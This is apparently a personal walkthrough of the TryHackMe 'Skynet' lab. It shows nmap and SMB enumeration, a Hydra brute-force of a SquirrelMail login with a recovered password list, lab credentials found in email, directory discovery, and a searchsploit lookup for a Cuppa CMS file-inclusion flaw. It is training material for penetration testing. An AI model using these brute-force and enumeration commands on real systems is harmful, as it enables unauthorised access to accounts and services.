[TryHackMe \| Cyber Security Training](https://tryhackme.com/room/skynet)

Are you able to compromise this Terminator themed machine?
![[Pasted image 20251021183005.png]]

---
# Enumeration
## Nmap basic
```bash
└─# nmap 10.10.190.192 -T5 -Pn    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-21 18:33 +04
Nmap scan report for 10.10.190.192
Host is up (0.20s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

```
## Nmap complete
```bash
┌──(root㉿kali)-[/home/z3tssu/THM/Skynet]
└─# nmap 10.10.190.192 -T5 -p22,80,110,139,143,445 -A 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-21 18:53 +04
Nmap scan report for 10.10.190.192
Host is up (0.28s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP RESP-CODES PIPELINING CAPA UIDL SASL AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK IMAP4rev1 more ENABLE SASL-IR IDLE ID LOGINDISABLEDA0001 post-login LITERAL+ Pre-login capabilities listed LOGIN-REFERRALS have
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (95%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-10-21T09:53:55-05:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-21T14:53:55
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   495.18 ms 10.9.0.1
2   495.32 ms 10.10.190.192

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.59 seconds

```

## Port 80 Webserver
![[Pasted image 20251021185658.png]]
nothing to special there

## Enumerate SMB 
Lets try and list the shares on this server
```
smbclient -L \\\\10.10.190.192\\
```
```
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))

```
![[Pasted image 20251021185940.png]]

We see there is an anonymous share and the milsdyson share which looks interesting, lets see if we can access it

1. milesdyson
```
┌──(root㉿kali)-[/home/z3tssu/THM/Skynet]
└─# smbclient \\\\10.10.190.192\\milesdyson -N
tree connect failed: NT_STATUS_ACCESS_DENIED

```
![[Pasted image 20251021190219.png]]
2. anonymous 
```
┌──(root㉿kali)-[/home/z3tssu/THM/Skynet]
└─# smbclient \\\\10.10.190.192\\anonymous -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 20:04:00 2020
  ..                                  D        0  Tue Sep 17 11:20:17 2019
  attention.txt                       N      163  Wed Sep 18 07:04:59 2019
  logs                                D        0  Wed Sep 18 08:42:16 2019

                9204224 blocks of size 1024. 5831500 blocks available
smb: \> 

```

### Download the files 
Since we have seen there are some files we can have access to, lets download it to our attacker machine with the command "get file_name.txt", we can also browse to the log directory to see what we get
```
get attention.txt
```

### Viewing the contents of attention.txt
```
┌──(z3tssu㉿kali)-[~/THM/Skynet]
└─$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

```
### Getting the files in the log directory
```
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \logs\> 

```

### Viewing the contents of the log files
```
┌──(z3tssu㉿kali)-[~/THM/Skynet]
└─$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13

```

Seems to be some sort of password list that must have been used on the server, so im guessing we will use this to bruteforce a login.

Lets leave this for now until we can identify something to bruteforce, I was thinking ssh, but typically you don't bruteforce SSH at first, so there must be another entry

---

## Directory Enumeration
I'm thinking we conduct some directory bruteforce on the IP address with gobuster, to see what we can identify 
```bash
gobuster -u http://<ip> -w <wordlist_location> -t 40
```


After the gobuster we have identified an interesting sub-directory: 
- /squirrelmail

## Viewing Squirrelmail SubDirectory
![[Pasted image 20251021194440.png]]

We now have a login page to try and bruteforce the username and password list.

Let us use Hydra to do this

# Bruteforcing Squirrelmail Directory with Hydra

## Capture Burpsuite request
1. The first step is to capture the request of the webpage using burpsuite
![[Pasted image 20251021194717.png]]

## Creating Hydra bruteforce Payload (http-post-form)

We will use the http-post-form payload since this is a webpage to bruteforce the login
```
hydra -l username -P password_list.txt ip_address http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.'
```

![[Pasted image 20251021195208.png]]

The above image is how we construct the http-post-form payload for http bruteforce 
## Bruteforcing 

```bash
┌──(root㉿kali)-[/home/z3tssu/THM/Skynet]
└─# hydra -l milesdyson -P log1.txt 10.10.190.192 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.' 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 19:56:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.190.192:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
[80][http-post-form] host: 10.10.190.192   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 19:56:47

```

![[Pasted image 20251021195708.png]]

We now have the password for milesdyson:cyborg007haloterminator

# Log into Squirrelmail Directory

Now that we have a valid credentials, let us log into the webpage
![[Pasted image 20251021195841.png]]

## Enumeration of Squirrelmail
First i was checking out the emails on the mailserver, i have identified an email from skynet@skynet, which has stated that the smb password has been changed 
![[Pasted image 20251021200016.png]]

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

this might open some new doors for SMB Enumeration 

# Enumerating SMB with credentials 

let us try and enumerate the SMB shares again with the newly found credentials, lets try with SMBMap this time
```bash
smbmap -u milesdyson -p $smb_pass -H 10.10.190.192
```

![[Pasted image 20251021200441.png]]

We have identified some shares, im pretty sure they are the same as before
# Accessing milesdyson share

Now that we have identified that the milesdyson share is readonly to us, we can access it with smbclient 
```
smbclient //ip_address/share_name/ -U username
```

![[Pasted image 20251021200835.png]]

We now have access to this share and can view the contents listed within
# Downloading files on the share with smbget
```
smbget -R smb://ip_address/share_name -U username
```

okay so the tool did not work, but that's okay lets manually go through and download the files 

I navigate to an interesting directory and found the file important.txt
![[Pasted image 20251021201856.png]]

I then downloaded this file and viewed the contents of it
![[Pasted image 20251021201937.png]]

This seems to provide us with the answer for the question, as it seems to be a directory
```
┌──(z3tssu㉿kali)-[~/THM/Skynet]
└─$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

# Lets navigate to new directory 
![[Pasted image 20251021202252.png]]

So what now? 

The questions asks us, what is the vulnerability called when you can include a remote file for malicious purposes, the answer after a quick google search is: Remote File Inclusion.

But what does this mean? It might feel like we are at a dead end now, i have tried accessing the ssh server with no luck on the passwords that was found

I'm assuming it has something to do with the new directory that we have identified, lets try and bruteforce it to see what we can identify further of any sub-directories that may be useful.
# Directory Bruteforce 
```bash
                                                                                                                    
┌──(root㉿kali)-[/home/z3tssu/THM/Skynet]
└─# gobuster dir -u http://$ip/45kra24zxs28v3yd/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.116.36/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 337] [--> http://10.10.116.36/45kra24zxs28v3yd/administrator/]
Progress: 8543 / 220558 (3.87%)^
```

## Viewing the discovered directory
![[Pasted image 20251022192021.png]]

We now have our next attack point, this is a login page for the Cuppa CMS
1. We could explore default credentials
2. We could try bruteforce the login 

## Searchsploit
Lets use searchsploit to try and find some vulnerabilities on this CMS
```bash
└─# searchsploit cuppa          
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                   | php/webapps/25971.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

